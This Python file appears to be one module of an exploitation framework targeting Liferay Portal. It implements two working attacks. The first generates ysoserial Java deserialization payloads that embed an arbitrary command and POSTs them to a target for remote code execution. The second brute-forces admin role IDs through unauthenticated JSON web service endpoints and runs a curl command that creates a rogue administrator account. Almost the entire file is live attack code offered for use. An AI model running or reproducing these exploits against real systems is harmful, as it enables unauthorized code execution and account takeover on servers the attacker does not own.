import logging

from tabulate import tabulate
import requests
import requests.exceptions as exception
import os
import urllib3
import time

# Total payloads
total = 2

# Information data of payload
data_set = {
    1: [
        "Java Deserialization",
        "The process of converting application data to another format (usually binary) suitable for transportation is called serialization. The process of reading data back in after it has been serialized is called unserialization.\n"
        "Vulnerabilities arise when developers write code that accepts serialized data from users and attempt to unserialize it for use in the program\n\n"
        "(*) Affected Versions: many",
        """
Available payload types                     
-----------------------------------------                   
BeanShell1                     Hibernate1
CommonsBeanutils1              Hibernate2            
CommonsCollections1            JSON1             
CommonsCollections2            Jdk7u21               
CommonsCollections3            MozillaRhino1                     
CommonsCollections4            MozillaRhino2                    
CommonsCollections5            Myfaces1   
CommonsCollections6            ROME        
Groovy1                        Spring1                    
Vaadin1                        Spring2 
          """,
        "Exploit through Java Serialization Vulnerability",
        "https://www.tenable.com/security/research/tra-2017-01\n"
        "https://issues.liferay.com/browse/LPE-15538\n"
        "https://issues.liferay.com/browse/LPS-64441"],
    2: [
        "Json Unauthenticated",
        "All JSON web services are, by default, accessible without authentication. Due to this vulnerability, anyone can create a new user with administrator rights\n\n"
        "(*) Affected Versions: 6.0.12 EE, 6.1.0 CE GA1, 6.1.10 EE GA1, 6.2.0 CE M2",
        "Create admin account illegal",
        "https://issues.liferay.com/browse/LPS-26935\nhttps://www.acunetix.com/vulnerabilities/web/liferay-json-service-api-authentication-vulnerability\n"
        "https://dl.packetstormsecurity.net/1208-exploits/liferayjson-bypass.txt"]
}

# List gadgets
gadgets = ["CommonsBeanUtils", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
           "CommonsCollections4", "Jdk7u21", "Json1", "ROME", "Spring1", "Spring2", "BeanShell1", "CommonsCollections5",
           "CommonsCollections6", "CommonsCollections7", "Groovy1",
           "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})


# [LPS-64441] Java Serialization Vulnerability
class Deserialization:
    description = data_set[1][1]
    refer = data_set[1][4]
    gadget = data_set[1][2]

    def __init__(self, url, lib, command, path):
        self.url = url
        self.lib = lib
        self.command = command
        self.path = path

    # Begin Getter / Setter
    @property
    def url_gs(self):
        return self.url

    @property
    def lib_gs(self):
        return self.lib

    @property
    def command_gs(self):
        return self.command

    @property
    def path_gs(self):
        return self.path

    @url_gs.setter
    def url_gs(self, new_url):
        self.url = new_url

    @lib_gs.setter
    def lib_gs(self, new_lib):
        self.lib = new_lib

    @command_gs.setter
    def command_gs(self, new_command):
        self.command = new_command

    @path_gs.setter
    def path_gs(self, new_path):
        self.path = new_path

    # End of Getter / Setter

    # Show all options of payload
    def show_options(self):
        print(self.gadget)
        header = ["Name", "Current Setting", "Required", "Description"]
        data = [("url", self.url, "yes", "Target to exploit"),
                ("lib", self.lib, "yes", "Vulnerable library"),
                ("command", self.command, "yes", "Command to embed into payload"),
                ("path", self.path, "no", "Path of exists your payload")]
        print("")
        print(tabulate(data, headers=header))
        print("")

    # Execute Function
    def execute(self):
        check = True
        try:
            if self.url and self.command and self.lib != "None":
                if self.lib in gadgets:
                    # Exploit with existing payload
                    if self.path != "None":
                        payload = open(self.path, "rb")
                        rq = session.post(self.url, data=payload)
                        if rq.status_code == 200:
                            print("~> Payload sending successfully!")
                        else:
                            print("~> Error while sending payload!")
                    # Generate payload and exploit
                    else:
                        command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} '{}' > core/generated_payload/{}.bin".format(
                            os.getcwd(), self.lib, self.command, self.lib)
                        os.system(command)
                        payload = open("{}/core/generated_payload/{}.bin".format(os.getcwd(), self.lib), "rb")
                        rq = session.post(self.url, data=payload)
                        if rq.status_code == 200:
                            print("~> Payload sending successfully!")
                        else:
                            print("~> Error while sending payload!")
                else:
                    print("[!] Gadget is not found!")
            else:
                print("[!] Required option is not set!")
        except IndexError:
            print("[!] Url is empty!")
            logging.error("[!] Url is empty!")
        except exception.ConnectionError:
            print("[!] Name or service not known!")
            logging.error("[!] Name or service not known!")
        except exception.InvalidURL and exception.MissingSchema:
            print("[!] Invalid Url - Url must start with http(s)!")
            logging.error("[!] Invalid Url - Url must start with http(s)!")
        except Exception as ex:
            print("[!] Something get error see the log file!")
            logging.error(ex)


# [LPS-26935] All JSON web services are accessible without authentication
class Json:
    description = data_set[2][1]
    refer = data_set[2][3]
    company_id = "10154"
    admin_role_id = ""

    def __init__(self, url, user, pwd, admin_id, start, end):
        self.url = url
        self.user = user
        self.pwd = pwd
        self.admin_id = admin_id
        self.start = start
        self.end = end

    # Begin Getter / Setter
    @property
    def url_gs(self):
        return self.url

    @property
    def user_gs(self):
        return self.user

    @property
    def pwd_gs(self):
        return self.pwd

    @property
    def admin_id_gs(self):
        return self.admin_id

    @property
    def start_gs(self):
        return self.start

    @property
    def end_gs(self):
        return self.end

    @url_gs.setter
    def url_gs(self, new_url):
        self.url = new_url

    @user_gs.setter
    def user_gs(self, new_user):
        self.user = new_user

    @admin_id_gs.setter
    def admin_id_gs(self, new_admin_id):
        self.admin_id = new_admin_id

    @pwd_gs.setter
    def pwd_gs(self, new_pwd):
        self.pwd = new_pwd

    @start_gs.setter
    def start_gs(self, new_start):
        self.start = new_start

    @end_gs.setter
    def end_gs(self, new_end):
        self.end = new_end

    # End Getter /  Setter

    # Show all options of payload
    def show_options(self):
        header = ["Name", "Current Setting", "Required", "Description"]
        data = [("url", self.url, "yes", "Target to exploit"),
                ("user", self.user, "yes", "Admin User you want to create"),
                ("pwd", self.pwd, "yes", "Admin Password you want to create"),
                ("admin_id", self.admin_id, "no", "Admin id to brute force roleID"),
                ("start", self.start, "yes", "Start number of range default/admin roleID"),
                ("end", self.end, "yes", "End number of range default/admin roleID")
                ]
        print("")
        print(tabulate(data, headers=header))
        print("")

    # Execute Function
    def execute(self):
        try:
            if self.url and self.user and self.pwd and self.start and self.end != "None":
                # Find Admin roleID with admin user id
                if self.admin_id != "None":
                    for roleId in range(int(self.start), int(self.end) + 1):
                        print("Try Role ID = {}".format(roleId))
                        params = {"roleId": roleId, "userId": self.admin_id}
                        rq = session.post(self.url + "/api/jsonws/user/has-role-user", params=params, verify=False)
                        if rq.text == "true":
                            self.admin_role_id = roleId
                            break
                # Find Admin roleID with default user id
                else:
                    params = {"companyId": self.company_id}
                    rq = session.post(self.url + "/api/jsonws/user/get-default-user-id", params=params, verify=False)
                    default_user_id = rq.text
                    for roleId in range(int(self.start), int(self.end) + 1):
                        params = {"roleId": roleId, "userId": default_user_id}
                        rq = session.post(self.url + "/api/jsonws/user/has-role-user", params=params, verify=False)
                        if rq.text == "true":
                            self.admin_role_id = roleId - 1
                            break
                print("~> Admin role id = {}".format(self.admin_role_id))
                time.sleep(1)

                # Create Admin user
                if self.admin_role_id and self.company_id is not None:
                    print("\n [+] Creating Administrator User:")
                    # https://openid-provider.appspot.com/TUNGTO2010
                    # [LPS-29265] Examples provided in /api/jsonws are incorrect for some web services call
                    command = "curl {}/api/jsonws/user/add-user \
                      -d companyId={} \
                      -d autoPassword=false \
                      -d password1='{}' \
                      -d password2='{}' \
                      -d autoScreenName=true \
                      -d screenName='' \
                      -d emailAddress='{}' \
                      -d facebookId=1 \
                      -d openId='' \
                      -d locale=en \
                      -d firstName='Jen' \
                      -d middleName='W' \
                      -d lastName='Lee' \
                      -d prefixId=0 \
                      -d suffixId=0 \
                      -d male=false \
                      -d birthdayMonth=1 \
                      -d birthdayDay=15 \
                      -d birthdayYear=1999 \
                      -d jobTitle='rock star' \
                      -d groupIds= \
                      -d organizationIds= \
                      -d roleIds={}\
                      -d userGroupIds= \
                      -d sendEmail=false".format(self.url, self.company_id, self.pwd, self.pwd, self.user,
                                                 self.admin_role_id)
                    os.system(command)
                    print("")
                else:
                    print("[-] Cannot found Administrator roleId and Company ID !")
            else:
                print("[!] Required option is not set !")
        except IndexError:
            print("[!] Url is empty!")
            logging.error("[!] Url is empty!")
        except exception.ConnectionError:
            print("[!] Name or service not known!")
            logging.error("[!] Name or service not known!")
        except exception.InvalidURL and exception.MissingSchema:
            print("[!] Invalid Url - Url must start with http(s)!")
            logging.error("[!] Invalid Url - Url must start with http(s)!")
        except Exception as ex:
            print("[!] Something get error see the log file!")
            logging.error(ex)


# Information format to print out
def detail_format(description, refer):
    print("")
    print('\033[94m' + "Description")
    print("============" + '\033[93m')
    print(description)
    print("")
    print('\033[94m' + "References")
    print("============" + '\033[93m')
    print(refer)
    print("")


# Get detail information of payload
def get_detail_payload(payload_order):
    if payload_order == 1:
        detail_format(Deserialization.description, Deserialization.refer)
    if payload_order == 2:
        detail_format(Json.description, Json.refer)


# Create payload object when chosen
def payload_choose(latest_url, payload_order):
    global vul
    if payload_order == 1:
        vul = Deserialization(latest_url, "None", "None", "None")
    if payload_order == 2:
        vul = Json(latest_url, "None", "None", "None", 0, 0)


# Check if vulnerability's option exists
def check_exist_option(vul_option):
    try:
        getattr(vul, vul_option)
        return True
    except AttributeError:
        return False
